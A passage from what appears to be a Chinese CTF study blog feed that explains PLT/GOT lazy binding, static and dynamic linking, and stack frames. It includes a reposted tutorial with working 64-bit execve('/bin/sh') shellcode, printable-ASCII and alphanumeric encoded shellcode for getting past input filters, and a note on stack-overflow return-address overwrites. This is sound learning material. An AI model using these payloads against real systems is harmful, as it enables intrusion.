class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p><p>1、用来存放外部函数地址的数据段</p><p>2、用来获取数据段记录的外部函数地址的代码</p><p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p><p><img src="1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg" alt="img"></p><p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p><p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 <span class="built_in">printf</span> 地址，并写到 <span class="built_in">printf</span>@got</span><br><span class="line"><span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了</p><p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p><p>接下来，我们就来看一下这个“找”的工作是怎么实现的：</p><p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">080482</span>d0 &lt;common@plt&gt;:</span><br><span class="line"> <span class="number">80482</span>d0:ff <span class="number">35</span> <span class="number">04</span> a0 <span class="number">04</span> <span class="number">08</span>    pushl  <span class="number">0x804a004</span></span><br><span class="line"> <span class="number">80482</span>d6:ff <span class="number">25</span> <span class="number">08</span> a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a008</span></span><br><span class="line"> <span class="number">80482</span>dc:<span class="number">00</span> <span class="number">00</span>                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="number">080482e0</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line"> <span class="number">80482e0</span>:ff <span class="number">25</span> <span class="number">0</span>c a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a00c</span></span><br><span class="line"> <span class="number">80482e6</span>:<span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">80482</span>eb:e9 e0 ff ff ff       jmp    <span class="number">80482</span>d0 &lt;_init+<span class="number">0x28</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">080482f</span>0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> <span class="number">80482f</span>0:ff <span class="number">25</span> <span class="number">10</span> a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a010</span></span><br><span class="line"> <span class="number">80482f</span>6:<span class="number">68</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x8</span></span><br><span class="line"> <span class="number">80482f</span>b:e9 d0 ff ff ff       jmp    <span class="number">80482</span>d0 &lt;_init+<span class="number">0x28</span>&gt;</span><br></pre></td></tr></table></figure><p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p><p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p><p>（说一下怎么查看，先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x jmp的那个地址</code> 就可以）</p><p><img src="1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png" alt="img"></p><p>还记得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 函数的地址了</p><p>现在要做的是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $<span class="number">0x0</span>    <span class="comment">//将数据压到栈上，作为将要执行的函数的参数</span></span><br><span class="line">jmp    <span class="number">0x80482d0</span>   <span class="comment">//去到了第一个表项</span></span><br></pre></td></tr></table></figure><p>接下来继续</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080482</span>d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  <span class="number">0x804a004</span>  <span class="comment">//将数据压到栈上，作为后面函数的参数</span></span><br><span class="line">jmp    *<span class="number">0x804a008</span> <span class="comment">//跳转到函数</span></span><br><span class="line">add    %al,(%eax)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p><p><img src="1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="img"></p><p>当执行后他有了值</p><p><img src="1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="img"></p><p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p><p>那现在做一个小总结：</p><p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p><p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p><p>到这里我们还需要知道</p><ol><li>_dl_runtime_resolve 是怎么知道要查找 printf 函数的</li><li>_dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li></ol><p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址</p><p>在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p><p><img src="1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="img"></p><p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p><p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p><p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p><p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p><p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p><p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p><p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p><p><strong>跟着大佬的流程图来走一遍：</strong></p><p>第一次调用</p><p><img src="1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p><p>之后再次调用<img src="1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c-165011977946810.jpeg" alt="img"></p><br/><br/><br/><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="* shellcode"></a>* shellcode</h2><p>文章转自：<a href="https://nuoye-blog.github.io/2020/05/09/dea90f48/">64位shellcode编写 | nuoye’s blog (nuoye-blog.github.io)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p><h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p><h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p><p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p><p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p><p>总结下，我们应该完成如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 59</span><br><span class="line">rdi = [&#x27;/bin/sh&#x27;]</span><br><span class="line">rsi = [0]</span><br><span class="line">rdx = 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>所以就可以编写我们就可以开始正式编写了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p><p>编写完后，我们可以用pwntools模块来快速编译使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure><p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p><p>针对这一种白名单，已经有了一个不错的工具：<a href="https://github.com/rcx/shellcode_encoder">shellcode_encoder</a></p><p>使用这一工具首先需要安装z3-solver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure><p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p><p>然后就会自动生成可打印的shellcode了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-`8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Gz#&#x27;-~  @5?_?_P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-e3&#x27;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3`&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3`&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-``(~5&gt;/o?P_AAAAo&#123;5mTM=K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+/O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure><p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p><h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p><p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure><br/><br/><br/><h2 id="Dynamic-and-Static-Link"><a href="#Dynamic-and-Static-Link" class="headerlink" title="Dynamic and Static Link"></a>Dynamic and Static Link</h2><p>原文链接：<a href="https://lantern.cool/note-binary-dynamic-static-link/">Dynamic and Static Link | Lantern’s 小站</a></p><br/><br/><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;库是写好的现有的，成熟的，可以复用的代码。现实中每个程序都要依赖很多基础的底层库，不可能每个人的代码都从零开始，因此库的存在意义非同寻常。</p><p>本质上来说库是一种可执行代码的二进制形式，可以被操作系统载入内存执行。</p><p>库有两种：静态库（.a、.lib）和动态库（.so、.dll）。</p><p>windows 上对应的是.lib .dll linux 上对应的是.a .so</p><br/><br/><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;源文件（.h, .cpp 等） =&gt; 预编译 =&gt; 编译 =&gt; 汇编 =&gt; 链接 =&gt; 可执行文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;而静态库、动态库区别来自<code>链接阶段</code>如何处理库从而链接成可执行文件，分别称为静态链接和动态链接</p><p><br/><br/></p><h3 id="静态库"><a href="#静态库" class="headerlink" title="静态库"></a>静态库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;在链接阶段，会将汇编生成的目标文件.o 与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。</p><p>特点:</p><ul><li>静态库对函数库的链接是在<code>编译阶段</code>完成的</li><li>程序在运行时与函数库再无关系，移植方便</li><li>浪费空间和资源，因为所有相关的目标文件与涉及到的函数库将被链接合成一个可执行文件</li></ul><p>问题:</p><ul><li>空间浪费：如果静态库再内存中存在多份拷贝，例如该静态库占用 1 内存，有 2000 个程序运用了该静态库，将占用将近 2GB 内存</li><li>对程序更新、部署和发布带来麻烦：如果静态库 liba.lib 更新将导致它的应用程序都需重新编译、发布给用户。对用户而言可能是一个很小的改动，却导致整个程序重新下载，全量更新</li></ul><p><br/><br/></p><h3 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。动态库在程序运行是才被载入，也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可，增量更新。</p><p>特点:</p><ul><li>动态库把对一些库函数的链接载入推迟到程序运行的时期</li><li>可以实现进程之间的资源共享（因此动态库也称为共享库）</li><li>程序升级变得简单</li><li>可以真正做到链接载入完全由程序员在程序代码中控制（显示调用）</li></ul><p>问题:</p><ul><li>“DLL 地狱”: 如果较新的版本不能正确地向后兼容，则不兼容的更新库将破坏依赖于库以前版本的可执行文件</li><li>程序及其使用的库可以作为软件包进行认证（例如，关于正确性，文档要求或性能）, 但是，如果可以更换组件，则不能。（这也反对在关键系统中自动进行操作系统更新；在两种情况下，操作系统和库均构成合格环境的一部分）</li></ul><br/><p>参考:</p><p>链接：<a href="https://www.zhihu.com/question/20484931">Linux 中的动态链接库和静态链接库是干什么的？</a></p><br/><p>链接：<a href="https://www.anquanke.com/post/id/183370">深入理解GOT表覆写技术 - 安全客，安全资讯平台 (anquanke.com)</a></p><br/><br/><h2 id="ubuntu-vscode"><a href="#ubuntu-vscode" class="headerlink" title="ubuntu vscode"></a>ubuntu vscode</h2><p><a href="https://blog.csdn.net/qq_35092399/article/details/105526908">Ubuntu使用VSCode无法输入中文_饿鬼点心的博客-CSDN博客</a></p><h2 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h2><p><a href="https://zhuanlan.zhihu.com/p/67920410">Bitmap的原理和应用 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <summary type="html">pwn</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>栈分析</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/13/%E6%A0%88%E5%88%86%E6%9E%90/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/13/%E6%A0%88%E5%88%86%E6%9E%90/</id>
    <published>2022-04-12T16:04:45.000Z</published>
    <updated>2022-08-05T03:06:16.549Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常规函数运行时栈况"><a href="#常规函数运行时栈况" class="headerlink" title="常规函数运行时栈况"></a>常规函数运行时栈况</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#源码</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line">haha();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">lala();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wawa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><p>如下得到 hawala.out ，复制到 widows 中丢进 ida 进行反编译</p><p><img src="image-20220413140332809.png" alt="image-20220413140332809"></p><p>对于 $ gcc -o hawala.out hawala.c -m32  ，(gcc -o &lt;生成文件名&gt; &lt;所要编译的文件名&gt; -m32，其中-m32表示编译为32位文件)</p><p>以上得到的 hawala.out 复制到 windows 下，丢进32位ida得到反编译汇编码</p><p>main()函数：</p><p><img src="image-20220413095816044.png" alt="image-20220413095816044"></p><p>haha()函数：</p><p><img src="image-20220413100920439.png" alt="image-20220413100920439"></p><p>lala()函数：</p><p><img src="image-20220413100947928.png" alt="image-20220413100947928"></p><p>从上面三个函数我们可以看到普通函数的函数头与函数尾的汇编指令大致与下图无异</p><p><img src="image-20220413101030564.png" alt="image-20220413101030564"></p><h2 id="单看函数头与函数尾"><a href="#单看函数头与函数尾" class="headerlink" title="单看函数头与函数尾"></a>单看函数头与函数尾</h2><p>图1（初始栈况）：地址值均为假设，栈左边为栈地址，栈中间为栈上存储的数据，ebp、esp存储的值为栈地址，栈从高地址向低地址生长。十六进制，一个数字代表4位</p><p><img src="image-20220413104217132.png" alt="image-20220413104217132"></p><p>图2（函数头）：push  ebp  ，效果，esp下移，ebp寄存器的值入栈（下图中ebp存储的是栈地址0xffff0080）</p><p><img src="image-20220413104250916.png" alt="image-20220413104250916"></p><p>图3（函数头）：mov  ebp, esp  ，效果，esp值赋给ebp</p><p><img src="image-20220413104939500.png" alt="image-20220413104939500"></p><p>图4（函数头）：and  esp, 0FFFFFFF0h  (注意这是9位数，带7个F，其中h表示16进制），将esp与0xfffffff0进行按位与操作，好像是对齐操作，总之效果就是将esp的后四位置0，使esp指针向下移动，又由图2知此时esp寄存器值为0xffff0070，后四位为0，所以将它与0xfffffff0按位与后esp位置不变</p><p><img src="image-20220413105821968.png" alt="image-20220413105821968"></p><p>图5：假设函数中间的汇编使esp执行到了向下的任意位置，但ebp是不会变的</p><p><img src="image-20220413110344050.png" alt="image-20220413110344050"></p><p>图6（函数尾）：mov  esp， ebp  ，效果：ebp的值赋给esp，导致esp指向0xffff0070</p><p><img src="image-20220413110623204.png" alt="image-20220413110623204"></p><p>图7（函数尾）：pop  ebp   ，效果：取出esp指向的栈上的数据赋给ebp，esp再自增四个字节</p><p><img src="image-20220413111149492.png" alt="image-20220413111149492"></p><p>图8（函数尾）：pop  eip  ，效果：此时eip被赋值为0xffff0074地址处的值0x????????</p><p><img src="image-20220413111516961.png" alt="image-20220413111516961"></p><p>最后：  jmp  eip  ，效果：程序跳转到eip寄存器上的地址开始执行，这也是为什么说ebp的上一栈位置为ret指令的原因，通过栈溢出将system(“/bin/sh”)的地址覆盖到ebp指针的上一栈位置处，我们就能执行system函数拿到shell。</p><br/><p>上述过程没有列出函数中间部分的汇编指令对esp、ebp的影响，甚至中间有一些call指令，对于这里的call指令，它应该就是调用别的函数做一些必要操作，call函数调用过程中会改变ebp的值，但调用完后，ebp值又会恢复到调用call指令前的位置，所以可以视为在执行函数中间部分（非函数头、函数尾的部分）的前后，ebp寄存器的值不变</p><p><img src="image-20220413112154187.png" alt="image-20220413112154187"></p><br/><p>总结：若此文你是在博客中看到的，可以试试 ctrl+滚轮 放大观看</p><p><img src="image-20220413115522038.png" alt="image-20220413115522038"></p><br/><h2 id="以源码中的程序为例"><a href="#以源码中的程序为例" class="headerlink" title="以源码中的程序为例"></a>以源码中的程序为例</h2><p>请自行分析</p><br/><br/><h1 id="libc库函数调用时栈况-plt、got"><a href="#libc库函数调用时栈况-plt、got" class="headerlink" title="libc库函数调用时栈况(plt、got)"></a>libc库函数调用时栈况(plt、got)</h1><p>因为lala()函数中带有libc库函数printf（动态链接库，啥是动态链接？，自己想办法了解或者我的博客里去翻）</p><p><img src="image-20220413120044419.png" alt="image-20220413120044419"></p><p>所以我们就拿这个printf举例</p><h2 id="不跟进printf-plt，观察ebp、esp前后变化"><a href="#不跟进printf-plt，观察ebp、esp前后变化" class="headerlink" title="不跟进printf@plt，观察ebp、esp前后变化"></a>不跟进printf@plt，观察ebp、esp前后变化</h2><p>因为开启了地址随机化保护，所以我们就直接在lala()函数下断点，再ni单步执行到call printf</p><p><img src="image-20220413141235714.png" alt="image-20220413141235714"></p><p><img src="image-20220413141341649.png" alt="image-20220413141341649"></p><p>ok，马上就要进入到plt表中了，此时ebp指向0xffffd028（由下图可知0xffffd028上存的是0xffffd038，0xffffd038上存的是0xffffd048，担心你们不懂什么意思，我再补一张栈图），esp指向0xffffd010</p><p><img src="image-20220413141719535.png" alt="image-20220413141719535"></p><p><img src="image-20220413142706205.png" 